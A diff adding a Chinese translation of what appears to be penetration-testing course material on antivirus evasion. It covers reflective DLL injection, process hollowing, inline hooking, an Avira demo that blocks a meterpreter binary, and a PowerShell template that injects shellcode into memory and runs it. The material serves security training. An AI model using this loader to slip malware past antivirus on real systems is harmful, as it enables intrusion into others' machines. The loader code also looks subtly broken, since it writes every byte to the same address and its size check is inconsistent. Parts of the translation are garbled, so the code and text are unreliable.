@@ -1,0 +1,102 @@
+
+## 17.3.2.2 反射型 DLL 注入 (Reflective DLL Injection)
+
+普通的 DLL 注入意味着使用 `LoadLibrary` API 从磁盘加载恶意 DLL，与之不同，该技术尝试加载由攻击者存储在进程内存中的 DLL。
+
+## 17.3.2.3 进程镂空 (Process Hollowing)
+
+当使用进程镂空时，攻击者首先启动一个处于挂起状态的非恶意进程。启动后，移除该进程的映像并将其替换为恶意可执行文件。最后，恢复进程运行并在合法进程内执行恶意代码。
+
+## 17.3.2.4 内联钩子 (Inline Hooking)
+
+顾如其名，该技术涉及修改内存并在函数中引入钩子（重定向执行代码的指令），以将执行流指向我们的恶意代码。执行我们的恶意代码后，执行流将返回到修改后的函数并继续执行，就好像只有原始代码执行过一样。
+
+## 17.3.3 杀毒软件规避：实例演示
+
+现在我们已经对杀毒软件使用的检测技术和相应的绕过方法有了通用理解，可以将其转化为实际实例。
+
+找到一个绕过所有杀毒软件的通用解决方案是困难且耗时的，甚至是不可能的。考虑到典型渗透测试中的时间限制，针对客户端网络部署的特定杀毒软件要高效得多。
+
+为了本模块，我们将在 Windows 10 客户端上安装 Avira Free Antivirus Version 15.0.34。Avira 安装程序可以在 `C:\Tools\antivirus_evasion\` 目录下找到。安装后，我们可以在 Windows 10 搜索栏中搜索“Start Avira Antivirus”来检查其配置。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_494_0.png)
+
+图 264：在搜索栏中搜索 Start Avira Antivirus。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_495_0.png)
+
+启动此应用程序将显示 Avira 控制中心，我们可以在此处验证 `Real-Time Protection` 功能是否启用，如果没有，我们可以手动启用：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_495_1.png)
+
+图 265：Avira 控制中心。
+
+第一步，我们应该验证杀毒软件是否按预期工作。我们将使用之前生成的 meterpreter 负载并用 Avira 对进行扫描。
+
+PWK 2.0 版权 © Offensive Security Ltd. 版权所有。496
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+在将恶意 PE 文件传输到我们的 Windows 客户端后，我们将尝试运行该二进制文件并观察结果。
+
+```
+C:\Users\offsec\Desktop> dir
+
+Volume in drive C has no label.
+
+Volume Serial Number is 56B9-B874
+```
+
+```
+Directory of C:\Users\offsec\Desktop
+
+02/26/2018 10:20 AM  <DIR>
+02/26/2018 10:20 AM  <DIR>
+02/26/2018 06:16 AM                 73,862 binary.exe
+02/26/2018 05:55 AM                 799 Windows 10 Update Assistant.lnk
+                                     75,647 bytes
+                             3 File(s)
+                             3 Dir(s)                4,521,566,288 bytes free
+```
+
+```
+C:\Users\offsec\Desktop> binary.exe
+
+The system cannot execute the specified program.
+```
+
+列表 497 - Avira 正在阻止恶意 PE 的执行。
+
+在这种情况下，我们看到了一个错误消息，指示系统无法执行该文件。紧接着，Avira 弹出一个通知，告知我们该文件已被标记为恶意并已隔离。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_496_0.png)
+
+图 266：Avira 弹窗。
+
+## 17.3.3.1 PowerShell 内存注入
+
+根据我们的目标环境及其受限程度，我们可能可以通过 PowerShell 的帮助绕过杀毒软件。在下面的示例中，我们将使用一种类似于远程进程内存注入的技术。主要区别在于我们将针对当前正在执行的进程，在我们的案例中这将解释器。
+
+PowerShell 的一个非常强大的特性是它与 Windows API 交互的能力。这允许我们实现内存注入。将脚本作为 PE 执行的主要益处之一是，杀毒软件制造商很难判断脚本是否为恶意。在下面的列表中，我们提供了一个执行内存注入的基础模板：
+
+```powershell
+$code = '
+[DllImport("kernel32")]
+public static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32")]
+public static IntPtr CreateThread(IntPtr lpThread, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("msvcrt")]
+public static int memset(IntPtr dest, IntPtr src, uint count);'
+$win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru
+$sc = <byte[]>;
+$size = 0x100;
+if ($sc.length -gt 0x100) {
+    $x = $win32::VirtualAlloc([IntPtr]::Zero, [UIntPtr]$size, 0x3000, 0x40);
+    for ($i=0; $i -le $sc.length; $i++) {
+        $win32::memset([IntPtr]$x, [IntPtr]$sc[$i], 1);
+    }
+    $win32::CreateThread([IntPtr]::Zero, [IntPtr]::Zero, $x, [IntPtr]::Zero, 0, [IntPtr]::Zero);
+}
+```
